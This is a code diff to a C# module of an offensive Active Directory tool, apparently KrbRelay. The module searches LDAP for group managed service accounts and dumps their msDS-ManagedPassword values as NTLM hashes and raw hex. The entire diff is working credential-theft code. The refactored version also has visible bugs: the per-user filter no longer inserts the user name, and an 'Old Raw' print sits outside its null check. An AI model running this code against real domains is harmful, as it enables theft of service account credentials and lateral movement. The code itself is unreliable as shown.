@@ -3,7 +3,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
-using static KrbRelay.Natives;
+using System.Text;
 
 namespace KrbRelay.Clients.Attacks.Ldap
 {
@@ -11,57 +11,62 @@ namespace KrbRelay.Clients.Attacks.Ldap
     {
         public static void read(IntPtr ld, string gMsaUser = "")
         {
-            var timeout = new LDAP_TIMEVAL
-            {
-                tv_sec = (int)(new TimeSpan(0, 0, 30).Ticks / TimeSpan.TicksPerSecond)
-            };
-            IntPtr pLaps = Helpers.AllocHGlobalIntPtrArray(1 + 1);
-            var controlPtr = Marshal.StringToHGlobalUni("msDS-ManagedPassword");
-            Marshal.WriteIntPtr(pLaps, IntPtr.Size * 0, controlPtr);
-
-            int search = 0;
+            List<IntPtr> entries;
             if (string.IsNullOrEmpty(gMsaUser))
             {
-                search = ldap_search(
-                    ld,
-                    $"{Program.domainDN}",
-                    (int)LdapSearchScope.LDAP_SCOPE_SUBTREE,
-                    "(&(objectClass=msDS-GroupManagedServiceAccount))",
-                    pLaps,
-                    0);
+                entries = Generic.GetObjects(ld, State.domainDN, "(&(objectClass=msDS-GroupManagedServiceAccount))", "msDS-ManagedPassword");
             }
             else
             {
-                search = ldap_search(
-                    ld,
-                    $"{Program.domainDN}",
-                    (int)LdapSearchScope.LDAP_SCOPE_SUBTREE,
-                    String.Format("(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName={0}))", gMsaUser.ToUpper()),
-                    pLaps,
-                    0);
+                entries = Generic.GetObjects(ld, State.domainDN, "(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName={0}))", "msDS-ManagedPassword");
             }
-            //Console.WriteLine("[*] msgID: {0}", search);
 
-            IntPtr pMessage = IntPtr.Zero;
-            var r = Natives.ldap_result(
-                ld,
-                search,
-                1,
-                timeout,
-                ref pMessage);
-            Console.WriteLine("[*] ldap_result: {0}", (LdapResultType)r);
-            Dictionary<string, Dictionary<string, List<byte[]>>> result = new Dictionary<string, Dictionary<string, List<byte[]>>>();
-            var ber = Marshal.AllocHGlobal(IntPtr.Size);
-            for (var entry = ldap_first_entry(ld, pMessage); entry != IntPtr.Zero; entry = Natives.ldap_next_entry(ld, entry))
+            if (entries.Count == 0)
             {
-                string dn = Generic.GetLdapDn(ld, entry);
-                Dictionary<string, List<byte[]>> aa = Generic.GetLdapAttributes(ld, entry, ref ber);
-                var managedPassword = new MsDsManagedPassword(aa.Values.SelectMany(a => a).ToArray().SelectMany(a => a).ToArray());
+                Console.WriteLine("[-] No gMSA entries");
+                return;
+            }
+
+            foreach(var entry in entries)
+            {
+                string dn = Generic.GetDistinguishedName(ld, entry);
+
+                IntPtr ber = IntPtr.Zero;
+                Dictionary<string, List<byte[]>> aa = Generic.GetAttributes(ld, entry, ref ber);
+                var managedPassword = new MsDsManagedPassword(
+                    aa.Values.SelectMany(a => a).ToArray().SelectMany(a => a).ToArray()
+                );
+
+                Console.WriteLine("[+] Got gMSA:\n");
                 Console.WriteLine("Username: {0}", dn);
-                Console.WriteLine("NT hash: {0}", Helpers.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, managedPassword.CurrentPassword));
-                Console.WriteLine("PasswordGoodUntil: {0}", managedPassword.PasswordGoodUntil.ToString());
+                Console.WriteLine(
+                    "PasswordGoodUntil: {0}",
+                    managedPassword.PasswordGoodUntil.ToString()
+                );
+                Console.WriteLine(
+                     "NTLM: {0}",
+                     Helpers.KerberosPasswordHash(
+                         KERB_ETYPE.rc4_hmac,
+                         managedPassword.CurrentPassword
+                     )
+                 );
+                Console.WriteLine(
+                    "Raw: {0}",
+                    Helpers.ByteArrayToHex(Encoding.Unicode.GetBytes(managedPassword.CurrentPassword))
+                );
+
                 if (managedPassword.OldPassword != null)
-                    Console.WriteLine("Old NT hash: {0}", Helpers.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, managedPassword.OldPassword));
+                    Console.WriteLine(
+                        "Old NTLM: {0}",
+                        Helpers.KerberosPasswordHash(
+                            KERB_ETYPE.rc4_hmac,
+                            managedPassword.OldPassword
+                        )
+                    );
+                    Console.WriteLine(
+                        "Old Raw: {0}",
+                        Helpers.ByteArrayToHex(Encoding.Unicode.GetBytes(managedPassword.OldPassword))
+                    );
                 Console.WriteLine();
             }
             return;
@@ -103,12 +108,19 @@ namespace KrbRelay.Clients.Attacks.Ldap
                     }
 
                     var queryPasswordIntervalOffset = reader.ReadInt16();
-                    var queryPasswordIntervalTicks = BitConverter.ToInt64(blob, queryPasswordIntervalOffset);
+                    var queryPasswordIntervalTicks = BitConverter.ToInt64(
+                        blob,
+                        queryPasswordIntervalOffset
+                    );
                     NextQueryTime = DateTime.Now + TimeSpan.FromTicks(queryPasswordIntervalTicks);
 
                     var unchangedPasswordIntervalOffset = reader.ReadInt16();
-                    var unchangedPasswordIntervalTicks = BitConverter.ToInt64(blob, unchangedPasswordIntervalOffset);
-                    PasswordGoodUntil = DateTime.Now + TimeSpan.FromTicks(unchangedPasswordIntervalTicks);
+                    var unchangedPasswordIntervalTicks = BitConverter.ToInt64(
+                        blob,
+                        unchangedPasswordIntervalOffset
+                    );
+                    PasswordGoodUntil =
+                        DateTime.Now + TimeSpan.FromTicks(unchangedPasswordIntervalTicks);
                 }
             }
         }
